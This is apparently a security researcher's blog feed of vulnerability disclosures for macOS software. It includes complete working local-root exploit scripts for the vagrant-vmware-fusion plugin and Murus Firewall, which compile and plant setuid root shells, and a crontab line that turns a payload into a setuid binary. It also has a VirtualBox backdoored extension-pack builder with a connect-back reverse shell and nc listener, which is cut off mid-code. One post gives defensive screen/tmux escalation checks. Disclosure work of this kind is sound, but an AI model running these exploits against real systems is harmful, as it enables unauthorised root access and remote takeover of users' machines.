+It has taken until this week to get their fixes out, involving an entire rewrite
+of the vagrant plugin architecture in order to make it secure. However the issue
+could have been patched much quicker as it was a simple system() execution
+without path scrubbing.
+
+So now there is a new unified plugin - vagrant-vmware-desktop - which is meant
+to be more secure. Unfortunately their initial attempt failed to remove the old
+plugin from the system, even if you explicitly uninstall it, leaving it
+vulnerable.
+
+As of 07:22 on 28/03/18 there is one new update of the new
+vmware-vagrant-desktop plugin - version 1.0.1 - which also still does not seem
+to cause the old plugin to be removed. Hopefully this will be addressed soon.
+
+Right now though I guess you could call this 0day since the two releases that
+were meant to fix it apparently don&amp;#39;t work unless you follow the update notes
+and manually remove the old plugin.
+
+---- update 28/03/18 20:56 ----
+
+Turns out the issue is fixed, it just doesn&amp;#39;t do the cleanup of the old plugin
+until you execute vagrant. Seems odd not to do this during the installation
+process but oh well, at least it works.
+
+&lt;a href=&quot;https://m4.rkw.io/vagrant_vmware_privesc_4.0.25-5.0.4.sh.txt&quot;&gt;https://m4.rkw.io/vagrant_vmware_privesc_4.0.25-5.0.4.sh.txt&lt;/a&gt;
+f8fbea90f70e978a8178d45930fff05477e2836204d9d81b6ddad73a338cfb66
+--------------------------------------------------------------------------------
+#!/bin/bash
+echo
+echo &amp;quot;################################################################&amp;quot;
+echo &amp;quot;# vagrant_vmware_fusion plugin 4.0.25-5.0.4 local root privesc #&amp;quot;
+echo &amp;quot;# by m4rkw - &lt;a href=&quot;https://m4.rkw.io/blog.html                       #&amp;quot&quot;&gt;https://m4.rkw.io/blog.html                       #&amp;quot&lt;/a&gt;;
+echo &amp;quot;################################################################&amp;quot;
+echo
+
+cleanup() {
+  rm -rf ~/.vagrant_vmware_fusion_504_exp
+  mv -f ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb
+}
+
+gem_version=&amp;quot;2.4.2&amp;quot;
+plugin_version=`ls ~/.vagrant.d/gems/*/gems/ |grep vagrant-vmware-fusion |cut -d &amp;#39;-&amp;#39; -f4 |tail -n1`
+
+cat &amp;gt; /tmp/vvp_504.c &amp;lt;&amp;lt;EOF
+#include &amp;lt;unistd.h&amp;gt;
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl(&amp;quot;/bin/bash&amp;quot;,&amp;quot;bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;rm -f /tmp/vvp_504; /bin/bash&amp;quot;,NULL);
+  return 0;
+}
+EOF
+gcc -o /tmp/vvp_504 /tmp/vvp_504.c
+rm -f /tmp/vvp_504.c
+
+cd
+mkdir .vagrant_vmware_fusion_504_exp
+cd .vagrant_vmware_fusion_504_exp
+
+if [ ! -e ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
+  mv ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig
+fi
+
+cat &amp;gt; ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb &amp;lt;&amp;lt;EOF
+system(&amp;quot;/Users/#{ENV[&amp;quot;USER&amp;quot;]}/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/bin/vagrant_vmware_desktop_sudo_helper_darwin_amd64 vmnet -status&amp;quot;)
+exit 0
+EOF
+
+success=0
+
+export PATH=.:$PATH
+
+function attempt()
+{
+  cat &amp;gt; /tmp/vvp_504.c &amp;lt;&amp;lt;EOF
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+int main(int ac, char *av[])
+{
+  if (geteuid() == 0) {
+    setuid(0);
+    setgid(0);
+    system(&amp;quot;chown root:wheel /tmp/vvp_504&amp;quot;);
+    system(&amp;quot;chmod 4755 /tmp/vvp_504&amp;quot;);
+  }
+  execv(&amp;quot;/usr/bin/$1&amp;quot;,av);
+  return 0;
+}
+EOF
+  gcc -o $1 /tmp/vvp_504.c
+  rm -f /tmp/vvp_504.c
+
+  `ruby ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb 2&amp;gt;/dev/null`
+
+  r=`ls -la /tmp/vvp_504 |grep &amp;#39;\-rws&amp;#39; |grep root`
+
+  if [ &amp;quot;$r&amp;quot; != &amp;quot;&amp;quot; ] ; then
+    cleanup
+    cd
+    /tmp/vvp_504
+    exit 0
+  else
+    rm -f $1
+  fi
+}
+
+attempt &amp;quot;lsof&amp;quot;
+attempt &amp;quot;sed&amp;quot;
+attempt &amp;quot;awk&amp;quot;
+
+cleanup
+
+echo &amp;quot;not vulnerable&amp;quot;&lt;/pre&gt;</summary>
+    <title>CVE-2017-16873 Hashicorp vagrant-vmware-fusion v4.0.25-5.0.4 local root</title>
+    <updated>2018-03-28T07:22:01+01:00</updated>
+    <dc:date>2018-03-28T07:22:01+01:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/minotaur-fanotaur-and-excavataur.html</id>
+    <link href="http://m4.rkw.io/blog/minotaur-fanotaur-and-excavataur.html"/>
+    <summary>&lt;pre&gt;I have released three cryptocurrency mining projects:
+
+- Fanotaur: independently monitors Nvidia card temperatures and regulates fan
+  speeds to keep them at a preset temperature.
+
+- Minotaur: derives calibrated hashrates and power limits from your devices for
+  various crypto algorithms so as to get the maximum hashrate with the lowest
+  power limit. Monitors Nicehash market prices every 15s and ensures your
+  devices are always mining the most profitable algorithm. Has a sexy top-style
+  ncurses interface for monitoring and supports multiple miners.
+
+- Excavataur: shim that provides an Excavator style API so that Minotaur can
+  talk to multiple mining tools via a unified interface.
+
+We have great things planned for Minotaur!&lt;/pre&gt;</summary>
+    <title>Minotaur, Fanotaur and Excavataur</title>
+    <updated>2018-01-31T08:53:37+00:00</updated>
+    <dc:date>2018-01-31T08:53:37+00:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/two-local-root-privesc-bugs-in-arq-backup--510.html</id>
+    <link href="http://m4.rkw.io/blog/two-local-root-privesc-bugs-in-arq-backup--510.html"/>
+    <summary>&lt;pre&gt;Last year I found a couple more privilege escalation vectors in Arq Backup
+for Mac version 5.10. Both have now been fixed in the latest release.
+
+The first is relatively simple - the arq_updater binary (which runs as root)
+takes a path argument for the url to retrieve an Arq update from in the format
+Arq.zip. We can simply specify an arbitrary path - eg file:///tmp/blah/Arq.zip -
+on the local filesystem and this will get unzipped in the /Applications/
+directory. Although we can&amp;#39;t embed suid permissions into a zip file the updater
+binary sets +s on a handful of binaries as part of the installation process
+without validation.
+
+This means we can simply substitute one of these binaries in an arbitrary
+Arq.zip with a payload that will then receive the +s bit as well as root
+ownership.
+
+The second issue is a bit more involved and actually rather cool from an
+exploitation point of view :)
+
+The restorer binaries which were subject to direct privilege escalation in
+versions prior to 5.10 run as root. This means that when restoring files the
+process has privileges to write to anything that root can write to. The paths to
+restore files to are set by the Arq UI application and are either the original
+path of the backed up file or a computed path prefixed with &amp;quot;Restored by Arq&amp;quot;
+that the application carefully ensures is unique.
+
+However this path is passed to the restorer binary through the inter-app
+protocol that I reversed in a previous exploit, which means if we know how to
+talk to it we can specify an arbitrary restore path. So a local non-root user
+can drop a file into their home directory and then with a specially crafted
+payload, trigger the standardrestorer binary to restore it place of any file
+on the system.
+
+An interesting target for this is the root users crontab file at:
+
+/var/at/tabs/root
+
+It turns out that if a file appears at this path, even if it isn&amp;#39;t root-owned,
+it will be immediately processed by the cron system and any commands within will
+be executed as root (this oversight was reported to Apple).
+
+So, theoretically at this point we can create a cron file in the user&amp;#39;s home
+directory, wait for it to get backed up by Arq and then restore it in place of
+the root crontab in order to escalate to root access.
+
+The only thing in the way of this working is the HMAC validation. Every file
+backed up by Arq has a computed HMAC hash stored with the file and the restorer
+binaries validate this when restoring. There will typically be millions of files
+in the backup and we need to know the exact HMAC of the file, which is derived
+using a secret key stored in the login keychain.
+
+To figure this out we can, before doing anything else, dump the list of HMACs
+from the cache files in ~/Library/Arq/. The HMACs are sha1 hashes so simply
+making a unique list of anything that looks like a sha1 hash will be sufficient.
+We can then create our crontab file, wait for the next backup run and then scan
+the cache files again. Discarding any hashes that we saw the first time will
+give us a much smaller list of potential HMACs for the backed up file which we
+can trivially brute-force.
+
+After the cron file is restored we just wait up to 60 seconds for the minute
+cron interval to arrive and our payload gets executed.
+
+Both of these issues are fixed in the latest release of Arq.
+
+CVE-2017-16928 backup/restore exploit PoC:
+
+&lt;a href=&quot;https://m4.rkw.io/arq_5.10.rb.txt&quot;&gt;https://m4.rkw.io/arq_5.10.rb.txt&lt;/a&gt;
+98428e05e5a4c1a289e1077787adffd97dd422dc0073bafdc25a07e5e6788cb8
+------------------------------------------------------------------------------
+
+CVE-2017-16945 update mechanism exploit PoC:
+
+&lt;a href=&quot;https://m4.rkw.io/arq_5.10.sh.txt&quot;&gt;https://m4.rkw.io/arq_5.10.sh.txt&lt;/a&gt;
+1557066028363d7961ec04d7af52cdab41a34234c5aa1e9fe22d0ca36ab651e1
+------------------------------------------------------------------------------&lt;/pre&gt;</summary>
+    <title>Two local root privesc bugs in Arq Backup &lt;= 5.10</title>
+    <updated>2018-01-29T06:33:01+00:00</updated>
+    <dc:date>2018-01-29T06:33:01+00:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/protecting-against-unsafe-use-of-screentmux.html</id>
+    <link href="http://m4.rkw.io/blog/protecting-against-unsafe-use-of-screentmux.html"/>
+    <summary>&lt;pre&gt;It occurred to me recently that a lot of people probably use screen or tmux in
+ways that leave an easy path to privilege escalation open. For example if you
+start a screen session as your local user and then escalate to root inside the
+screen session. As soon as you do that, anyone with access to the non-root
+account can simply resume the screen session and immediately be root.
+
+It is therefore sensible to never do this and always escalate *before* starting
+a screen or tmux session. I&amp;#39;m pretty sure I&amp;#39;ve done this loads of times without
+really thinking about it. I decided to look into simple ways to mitigate this.
+
+On linux it&amp;#39;s pretty easy, we can add this code to /root/.bashrc:
+
+-------------------------------------------------------------------------------
+pid=$$
+
+screen=`which screen`
+tmux=`which tmux`
+
+while :
+do
+  parent=`ps -o ppid= $pid 2&amp;gt;/dev/null | xargs`
+
+  if [ &amp;quot;$parent&amp;quot; == &amp;quot;1&amp;quot; ] ; then
+    break
+  fi
+
+  exe=`readlink -f /proc/$parent/exe`
+  owner=`ps h -o ruser -p $parent`
+
+  if [ &amp;quot;$owner&amp;quot; != &amp;quot;root&amp;quot; ] ; then
+    if [ &amp;quot;$exe&amp;quot; == &amp;quot;$screen&amp;quot; -o &amp;quot;$exe&amp;quot; == &amp;quot;$tmux&amp;quot; ] ; then
+      echo &amp;quot;unsafe escalation - escalate to root *before* running screen/tmux!&amp;quot;
+      kill -9 `ps -o ppid= $$ 2&amp;gt;/dev/null | xargs`
+      exit 0
+    fi
+  fi
+
+  pid=$parent
+done
+-------------------------------------------------------------------------------
+
+Now if we spawn a root-owned shell from inside a screen this code will execute
+when it starts up. It walks up the parent process hierarchy and if it finds
+screen or tmux running as a non-root user it will terminate its parent and thus
+kill the escalation. This is what we see when this happens:
+
+$ screen
+$ sudo bash
+[sudo] password for user:
+unsafe escalation - escalate to root *before* running screen/tmux!
+Killed
+a ~ $
+
+Of course we can still escalate to root *outside* the screen session and we
+can still use sudo for other things inside screen that won&amp;#39;t leave a root-owned
+shell running.
+
+Doing this on macOS is a bit more complicated for a couple of reasons - firstly
+there&amp;#39;s the issue I blogged about here:
+
+&lt;a href=&quot;https://m4.rkw.io/blog/macos-sudo-wtf.html&quot;&gt;https://m4.rkw.io/blog/macos-sudo-wtf.html&lt;/a&gt;
+
+In that the default sudoers file that ships with macOS has the HOME path set to
+inherit when escalating with sudo, leading to your local admin&amp;#39;s dotfiles being
+executed as root when you escalate. I would strongly recommend disabling this.
+If you like the convenience of keeping your HOME environment variable when
+escalating you can simply add this to /var/root/.bashrc:
+
+export HOME=/Users/user
+
+(or whatever your home path is). This gives you basically the same convenience
+without the security compromise of having your dotfiles executed as root every
+time.
+
+But I digress. For the purposes of this post I&amp;#39;ll assume that you have made this
+change and that when you sudo your /var/root/.bashrc is the one that gets
+executed rather than the non-root user&amp;#39;s one.
+
+The second problem with doing this on macOS is that there&amp;#39;s not (at least as far
+as I know) an easy way to look up the real binary path for a process without
+using a system call. We have no handy proc filesystem like we have on linux and
+I&amp;#39;m not really a big fan of fuse.
+
+So first we need to write a little tool that will take a process id and give us
+the real path to its binary:
+
+-------------------------------------------------------------------------------
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;errno.h&amp;gt;
+#include &amp;lt;libproc.h&amp;gt;
+
+int main (int argc, char* argv[])
+{
+    pid_t pid; int ret;
+    char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
+    int i;
+
+    if (argc &amp;lt; 2) {
+      printf(&amp;quot;usage: %s &amp;lt;pid&amp;gt;\n&amp;quot;, argv[0]);
+      return 0;
+    }
+
+    ret = proc_pidpath (atoi(argv[1]), pathbuf, sizeof(pathbuf));
+
+    if ( ret &amp;gt; 0 ) {
+      printf(&amp;quot;%s\n&amp;quot;, pathbuf);
+    } else {
+      fprintf(stderr, &amp;quot;%s\n&amp;quot;, strerror(errno));
+    }
+
+    return 0;
+}
+-------------------------------------------------------------------------------
+
+Stick this in /usr/local/bin/ like so:
+
+$ sudo gcc -o /usr/local/bin/psr psr.c
+
+Now we can grab the real binary path for any process:
+
+$ psr $$
+/bin/bash
+$
+
+Cool. By the way the proc_pidpath() system call is quite handy when examining
+processes on your system. The process name shown in the ps output can be easily
+manipulated by overwriting argv[0] but I have no found a way to mask the real
+binary path returned by proc_pidpath(). It seems to be a low-level kernel
+function.
+
+So now we just need a bit of bash similar to the linux version in our
+/var/root/.bashrc file:
+
+-------------------------------------------------------------------------------
+screen=`which screen`
+tmux=`which tmux`
+
+function expand_path()
+{
+  p=$1
+
+  while :
+  do
+    realpath=`python -c &amp;#39;import os,sys;print(os.path.realpath(sys.argv[1]))&amp;#39; $p`
+    if [ &amp;quot;$realpath&amp;quot; == &amp;quot;$p&amp;quot; ] ; then
+      break
+    fi
+    p=$realpath
+  done
+}
+
+if [ &amp;quot;$screen&amp;quot; != &amp;quot;&amp;quot; ] ; then
+  expand_path $screen
+  screen=$p
+fi
+
+if [ &amp;quot;$tmux&amp;quot; != &amp;quot;&amp;quot; ] ; then
+  expand_path $tmux
+  tmux=$p
+fi
+
+pid=$$
+
+while :
+do
+  parent=`ps -o ppid= $pid 2&amp;gt;/dev/null | xargs`
+
+  if [ &amp;quot;$parent&amp;quot; == &amp;quot;1&amp;quot; ] ; then
+    break
+  fi
+
+  exe=`/usr/local/bin/psr $parent`
+  owner=`ps h -o ruser= $parent`
+
+  if [ &amp;quot;$owner&amp;quot; != &amp;quot;root&amp;quot; ] ; then
+    if [ &amp;quot;$exe&amp;quot; == &amp;quot;$screen&amp;quot; -o &amp;quot;$exe&amp;quot; == &amp;quot;$tmux&amp;quot; ] ; then
+      echo &amp;quot;unsafe escalation - don&amp;#39;t do this in a non-root screen/tmux session!&amp;quot;
+      kill -9 `ps -o ppid= $$ 2&amp;gt;/dev/null | xargs`
+      exit 0
+    fi
+  fi
+
+  pid=$parent
+done
+-------------------------------------------------------------------------------
+
+It&amp;#39;s a little more complicated because macOS package managers often install
+binaries using symlinks. I use screen from macports because it seems to work
+better than the standard one but the path returned by which is a symlink which
+obviously isn&amp;#39;t useful if we&amp;#39;re comparing against the output of the
+proc_pidpath() call. Also macOS doesn&amp;#39;t seem to support readlink -f so we need
+to use a tiny bit of python to expand the symlinks.&lt;/pre&gt;</summary>
+    <title>protecting against unsafe use of screen/tmux</title>
+    <updated>2017-12-15T09:35:22+00:00</updated>
+    <dc:date>2017-12-15T09:35:22+00:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/macos-high-sierra-10131-insecure-cron-system.html</id>
+    <link href="http://m4.rkw.io/blog/macos-high-sierra-10131-insecure-cron-system.html"/>
+    <summary>&lt;pre&gt;Recently I was working on a security issue in some other software that has yet
+to be disclosed which created a rather interesting condition. As a non-root
+user I was able to write to any file on the system that was not SIP-protected
+but the resulting file would not be root-owned, even if it previously was.
+
+This presented an interesting challenge for privilege escalation - how would you
+exploit this to obtain root access? The obvious first attempt was the sudoers
+file but sudo is smart enough not to process it if the file isn&amp;#39;t root-owned so
+that didn&amp;#39;t work.
+
+I then discovered (after a tip from a friend - thanks pndc!) that the cron
+system in macOS does not care who the crontab files are owned by. Getting root
+was a simple case of creating a crontab file at:
+
+/var/at/tabs/root
+
+with a 60-second cron line, eg:
+
+* * * * * chown root:wheel /tmp/payload &amp;amp;&amp;amp; chmod 4755 /tmp/payload
+
+and then waiting for it to execute. It&amp;#39;s not clear if this is a macOS-specific
+issue or a hangover from the BSD-inherited cron system, I suspect the latter.
+
+The issue has been reported to Apple so hopefully they will fix it.&lt;/pre&gt;</summary>
+    <title>macOS High Sierra 10.13.1 insecure cron system</title>
+    <updated>2017-12-06T07:32:52+00:00</updated>
+    <dc:date>2017-12-06T07:32:52+00:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/murus-firewall-1411-escalation-hihack--root-privesc.html</id>
+    <link href="http://m4.rkw.io/blog/murus-firewall-1411-escalation-hihack--root-privesc.html"/>
+    <summary>&lt;pre&gt;I recently blogged about the prevalence of escalation hijack vulnerabilities
+amongst macOS applications. One example of this is the latest version of Murus
+firewall. By design it requires the user to authenticate every time in order to
+obtain the access it needs to modify the firewall settings.
+
+If a local attacker or malware is running as an admin user (ie has write access
+to /Applications/) they can subvert this process to silently obtain root access
+without the user knowing.
+
+&lt;a href=&quot;https://m4.rkw.io/murus1.4.11.sh.txt&quot;&gt;https://m4.rkw.io/murus1.4.11.sh.txt&lt;/a&gt;
+9c332c07747e11c78c34f9dc8d30127250d95edd5e58a571ed1a005eafd32301
+-------------------------------------------------------------------------------
+#!/bin/bash
+
+##################################################################
+###### Murus 1.4.11 local root privilege escalation exploit ######
+###### by m4rkw - &lt;a href=&quot;https://m4.rkw.io/blog.html&quot;&gt;https://m4.rkw.io/blog.html&lt;/a&gt;               ######
+##################################################################
+
+echo &amp;quot;compiling payloads...&amp;quot;
+
+cat &amp;gt; /tmp/murus411_exp.c &amp;lt;&amp;lt;EOF
+#include &amp;lt;unistd.h&amp;gt;
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl(&amp;quot;/bin/bash&amp;quot;,&amp;quot;bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;rm -f /tmp/murus411_exp; /bin/bash&amp;quot;,NULL);
+  return 0;
+}
+EOF
+
+gcc -o /tmp/murus411_exp /tmp/murus411_exp.c
+
+if [ ! $? -eq 0 ] ; then
+  rm -f /tmp/murus411_exp.c
+	echo &amp;quot;failed to compile, dev tools may not be installed&amp;quot;
+  exit 1
+fi
+
+rm -f /tmp/murus411_exp.c
+
+cat &amp;gt; /tmp/murus411_exp2.c &amp;lt;&amp;lt;EOF
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  system(&amp;quot;chown root:wheel /tmp/murus411_exp&amp;quot;);
+  system(&amp;quot;chmod 4755 /tmp/murus411_exp&amp;quot;);
+  system(&amp;quot;mv /Applications/Murus.app/Contents/MacOS/Murus.orig /Applications/\
+Murus.app/Contents/MacOS/Murus&amp;quot;);
+  execl(&amp;quot;/Applications/Murus.app/Contents/MacOS/Murus&amp;quot;,&amp;quot;Murus&amp;quot;,NULL);
+  return 0;
+}
+EOF
+
+gcc -o /tmp/murus411_exp2 /tmp/murus411_exp2.c
+rm -f /tmp/murus411_exp2.c
+
+echo &amp;quot;waiting for loader...&amp;quot;
+
+while :
+do
+  ps auxwww |grep &amp;#39;/Applications/Murus.app/Contents/MacOS/MurusLoader&amp;#39; \
+    |grep -v grep 1&amp;gt;/dev/null
+  if [ $? -eq 0 ] ; then
+    break
+  fi
+done
+
+echo &amp;quot;planting payload...&amp;quot;
+
+mv /Applications/Murus.app/Contents/MacOS/Murus /Applications/Murus.app/\
+Contents/MacOS/Murus.orig
+mv /tmp/murus411_exp2 /Applications/Murus.app/Contents/MacOS/Murus
+
+echo &amp;quot;waiting for payload to trigger...&amp;quot;
+
+while :
+do
+  r=`ls -la /tmp/murus411_exp |grep root`
+  if [ &amp;quot;$r&amp;quot; != &amp;quot;&amp;quot; ] ; then
+    break
+  fi
+  sleep 0.1
+done
+
+echo &amp;quot;kapow&amp;quot;
+
+/tmp/murus411_exp&lt;/pre&gt;</summary>
+    <title>Murus Firewall 1.4.11 escalation hihack / root privesc</title>
+    <updated>2017-12-04T12:23:56+00:00</updated>
+    <dc:date>2017-12-04T12:23:56+00:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/owning-virtualbox-via-mitm.html</id>
+    <link href="http://m4.rkw.io/blog/owning-virtualbox-via-mitm.html"/>
+    <summary>&lt;pre&gt;VirtualBox is a virtualisation application written by Oracle that is quite popular
+presumably because its free. I&amp;#39;m not a fan myself - if my mac locks up
+completely or kernel panics it&amp;#39;s usually because I&amp;#39;ve loaded the vbox kernel
+extensions less than 10 minutes ago. I use VMware Fusion instead (which is fairly
+expensive but IMO worth the money) and have a ritual whereby if I&amp;#39;ve had to load
+the vbox kernel extensions for work-related reasons I will reboot the machine
+before doing anything else.
+
+I discovered back in May that if certain conditions are met it&amp;#39;s possible to
+achieve RCE in the VirtualBox application if you can MITM a user&amp;#39;s traffic. This
+is possible because, bizarrely, VirtualBox downloads updates over plain http:
+
+&lt;img src=&quot;https://m4.rkw.io/img/vbox_nossl.png&quot; /&gt;
+
+This is true for both the pkg installer (which carries an Apple Developer code
+signature, making tampering with it tricky) and also for the multi-architecture
+extension pack, which has no code signature.
+
+&lt;img src=&quot;https://m4.rkw.io/img/vbox_nossl2.png&quot; /&gt;
+
+Despite reporting this to Oracle nearly 7 months ago they still haven&amp;#39;t managed
+to put an SSL certificate on the download site. Hopefully this advisory will
+make people aware of the issue and encourage them to manually verify the
+checksum of the extension pack should they be in a situation where they&amp;#39;ve
+downloaded it manually.
+
+Little Snitch shows that vbox does talk to update.virtualbox.org over https to
+retrieve the version information, but the extension pack itself is downloaded
+over http.
+
+&lt;img src=&quot;https://m4.rkw.io/img/vbox_ls.png&quot; /&gt;
+
+The extension pack for macOS is a gzipped tarball containing these files:
+
+ExtPack-license.html
+ExtPack-license.rtf
+ExtPack-license.txt
+ExtPack.manifest
+ExtPack.signature
+ExtPack.xml
+PXE-Intel.rom
+darwin.amd64
+linux.amd64
+linux.x86
+solaris.amd64
+win.amd64
+win.x86
+
+ExtPack.signature looked interesting and potentially would thwart this attack
+vector but at the time of writing it simply contains the string &amp;quot;todo&amp;quot; LOL.
+
+$ cat ExtPack.signature
+todo
+
+In the darwin.amd64 directory we have a bunch of dylibs:
+
+$ ls -1 darwin.amd64/
+VBoxEhciR0.r0
+VBoxEhciR3.dylib
+VBoxEhciRC.rc
+VBoxHostWebcam.dylib
+VBoxNvmeR0.r0
+VBoxNvmeR3.dylib
+VBoxNvmeRC.rc
+VBoxPuelMain.dylib
+VBoxUsbCardReaderR3.dylib
+VBoxUsbWebcamR3.dylib
+VBoxVRDP.dylib
+VDPluginCrypt.dylib
+
+These are dynamic libraries that VirtualBox loads in order to add additional
+functionality. With a dylib you can define a custom constructor which will get
+executed as soon as the dylib is loaded. Something like this:
+
+--------------------------------------
+__attribute__((constructor))
+void customConstructor(int argc, char **argv)
+{
+  system(&amp;quot;touch /tmp/LOL&amp;quot;);
+}
+--------------------------------------
+
+If VirtualBox loads this, the code in the constructor will get executed. The
+extpack also has a manifest file which, bizarrely, contains hashes for all of
+the dylibs in a handful of different hash formats.
+
+$ grep VBoxEhciR3.dylib ExtPack.manifest
+MD5 (darwin.amd64/VBoxEhciR3.dylib) = d3fddbcadfa01e4f9ccd2e23de119c3f
+SHA256 (darwin.amd64/VBoxEhciR3.dylib) =
+f8692e2223ef6b90b84011b437f38873a907933ab6f822e6301d0d4e65427e0a
+SHA512 (darwin.amd64/VBoxEhciR3.dylib) =
+42750441b2054f3b63937e6e54f58af72978091adbe4c5efc18b04f429d84c07ca0818af1f361c0b53dec62b157d3e042a60ae030bfd7e147de73c19de694670
+SHA1 (darwin.amd64/VBoxEhciR3.dylib) = 0eef387c4de5441aa0623ae677ff8f0c21002f46
+SIZE (darwin.amd64/VBoxEhciR3.dylib) = 90064
+
+Oh and they also list the size for good measure lol :P
+
+So if we roll a fake dylib into an extpack tarball and set the size and hashes
+correctly, if the user clicks on the extpack VirtualBox will install it without
+any verification and then load the dylib and execute the constructor as soon as
+the user starts a VM.
+
+There is a catch though, although Vbox will install our modified extpack without
+verification when we click on it manually, the update mechanism performs a
+sha256 hash check.
+
+The update process for vbox is:
+
+1) Older version (eg 5.1.20) is launched, the user is prompted to download the
+newest version.  The link provided here is &lt;a href=&quot;http:// so this alone could be&quot;&gt;http:// so this alone could be&lt;/a&gt;
+intercepted and modified, but it would require a developer cert to sign a new
+pkg bundle for the user to install.
+
+2) After installing the new version, on the next launch it will prompt the user
+to install the new extpack for 5.1.22.  The API call to update.virtualbox.org
+happens over SSL so we can&amp;#39;t mess with the version numbers or the hashes that
+correspond to the new extpack.
+
+Now if we MITM the request to download.virtualbox.org and send our hacked
+extpack, VirtualBox says:
+
+&lt;img src=&quot;https://m4.rkw.io/img/vbox_reject.png&quot; /&gt;
+
+So it&amp;#39;s telling us to download it manually from the website.  A user seeing
+this probably wouldn&amp;#39;t suspect anything other than an Oracle mishap so they
+would likely hop over to virtualbox.org to download the extpack manually. The
+website does say &amp;quot;check the hashes&amp;quot; and provides SHA256 and MD5 checksums (which
+are served over SSL).
+
+The website www.virtualbox.org is served over SSL.. but the download link for
+the extension pack points to download.virtualbox.org over &lt;a href=&quot;http://. This is bad&quot;&gt;http://. This is bad&lt;/a&gt;
+because it means we can leave www.virtualbox.org un-messed-with so the user sees
+the SSL load correctly (and is lulled into a false sense of security because of
+the SSL padlock), but still MITM download.virtualbox.org in order to send our
+hacked payload.
+
+The filename for the extpack as its linked on the website is slightly different
+to the one requested by the application but we can still intercept it, and since
+it was downloaded manually vbox doesn&amp;#39;t verify the signature and just merrily
+installs it, allowing us to compromise the host.  Of course if a user is
+paranoid enough to check the hashes then they&amp;#39;ll notice something is wrong, but
+how many users are realistically going to do that?
+
+Amusingly, on installation it warns you to only install extension packs that you
+got from a trusted source - like, I dunno, say, the website of a trusted (?!)
+vendor THAT HAS ITS OWN CERTIFICATE AUTHORITY that you just loaded over SSL?
+
+As soon as any VM is started the code in our malicious dylib gets executed as
+the user running VirtualBox on the host machine.
+
+Obviously this will only work if the user doesn&amp;#39;t have the latest version, as
+otherwise there would be no reason for them to download an extpack. However vbox
+updates are fairly frequent so an attacker waiting around with MITM capability
+probably wouldn&amp;#39;t have to wait too long before being able to execute this
+attack.
+
+The PoC code below downloads the latest extension pack from the VirtualBox
+website and modifies it with a reverse tcp shellcode backdoor that will be
+executed as soon as a VM is started.
+
+To test it you can simply click on it to install it into virtualbox, listen for
+a shell with nc, eg:
+
+$ nc -l 5555
+
+and then start any vm.
+
+&lt;a href=&quot;https://m4.rkw.io/vbox_extpack_builder.rb.txt&quot;&gt;https://m4.rkw.io/vbox_extpack_builder.rb.txt&lt;/a&gt;
+6148d6aa7ad2896ae3679ed8e2ff46e7156fd9db9c9ef39fa4116c9566848606
+----------------------------------------------------------------------------
+#!/usr/bin/env ruby
+
+# RCE PoC builder for VirtualBox extension packs
+# Tested with version 5.2.2 on 30/11/17
+#
+# Discovered by m4rkw, shouts to #coolkids
+# PoC is for darwin.amd64 but other architectures are likely vulnerable
+#
+# This builds a backdoored extension pack which VirtualBox will happily install.
+# Once installed, when an OSX/64bit VM is started it will trigger the shellcode
+# and initiate a connectback shell.
+#
+# Thanks to Jacob Hammack for the shellcode
+
+require &amp;#39;digest&amp;#39;
+
+puts
+puts &amp;quot;RCE PoC builder for VirtualBox extension pack&amp;quot;
+puts &amp;quot;discovered by m4rkw, shouts to #coolkids&amp;quot;
+puts
+puts &amp;quot;PoC is for darwin.amd64 but other architectures may be vulnerable&amp;quot;
+puts
+puts &amp;quot;This builds a backdoored extension pack which VirtualBox will happily install.&amp;quot;
+puts &amp;quot;Once installed, when any VM is started it will trigger the shellcode and&amp;quot;
+puts &amp;quot;initiate a connectback shell to the specified IP and port&amp;quot;
+puts
+puts &amp;quot;Thanks to Jacob Hammack for the shellcode&amp;quot;
+puts
+
+if ARGV.length &amp;lt; 2
+  puts &amp;quot;Usage: #{__FILE__} &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;&amp;quot;
+  puts
+  exit 0
+end
+
+target_dylib = &amp;quot;VBoxEhciR3.dylib&amp;quot;
+
+puts &amp;quot;compiling attack.dylib...&amp;quot;
+
+File.open(&amp;quot;attack.c&amp;quot;,&amp;quot;w&amp;quot;) do |f|
+  f.write(&amp;quot;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;sys/mman.h&amp;gt;
+#include &amp;lt;arpa/inet.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
